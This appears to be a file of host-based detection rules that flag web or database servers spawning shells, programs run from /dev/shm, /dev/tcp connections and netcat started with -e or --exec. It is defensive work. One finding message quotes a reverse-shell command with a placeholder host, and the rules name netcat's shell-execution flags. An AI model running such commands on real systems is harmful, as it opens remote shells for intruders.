rules.title: A web server started a shell
rules.expression: (event['process.name'] == 'sh' || event['process.name'] == 'dash' || event['process.name'] == 'bash' || event['process.name'] == 'zsh' || event['process.name'] == 'ksh' || event['process.name'] == 'ash' || event['process.name'] == 'busybox') && ((event['parent.name'] == 'nginx' || event['parent.name'] == 'httpd' || event['parent.name'] == 'apache2' || event['parent.name'] == 'lighttpd' || event['parent.name'] == 'caddy') || event['parent.name'].startsWith('php-fpm'))
rules.finding_message: A web server process started a shell. That is how web shells and command injection usually look; legitimate CGI scripts are the common exception. Check the command line and the request that caused it.

rules.title: A database server started a shell
rules.expression: (event['process.name'] == 'sh' || event['process.name'] == 'dash' || event['process.name'] == 'bash' || event['process.name'] == 'zsh' || event['process.name'] == 'ksh' || event['process.name'] == 'ash' || event['process.name'] == 'busybox') && (event['parent.name'] == 'mysqld' || event['parent.name'] == 'mariadbd' || event['parent.name'] == 'redis-server' || event['parent.name'] == 'mongod')
rules.finding_message: A database server process started a shell. These servers do not normally run shell commands; it is a common sign of an abused feature (a Redis module or config write, a MySQL UDF). Check the command line.

rules.title: A program ran from /dev/shm
rules.finding_message: A program was executed from /dev/shm, a memory-backed directory anyone can write to. Software is not installed there; dropped payloads often are. Check the file and who started it.

rules.title: A shell opened a network connection with /dev/tcp
rules.finding_message: A shell command line uses /dev/tcp or /dev/udp, the usual form of a reverse shell (for example bash -i >& /dev/tcp/HOST/PORT 0>&1). Check the command line and the connection's address.

rules.title: Netcat was started with a program to run
rules.expression: (event['process.name'] == 'nc' || event['process.name'] == 'ncat' || event['process.name'] == 'netcat' || event['process.name'] == 'nc.openbsd' || event['process.name'] == 'nc.traditional') && (event['process.cmdline'].contains(' -e') || event['process.cmdline'].contains(' --exec ') || event['process.cmdline'].contains(' --sh-exec '))
rules.finding_message: Netcat was started with -e, --exec or --sh-exec, which connects a program (usually a shell) to the network: a classic bind or reverse shell. Check the command line and the address.
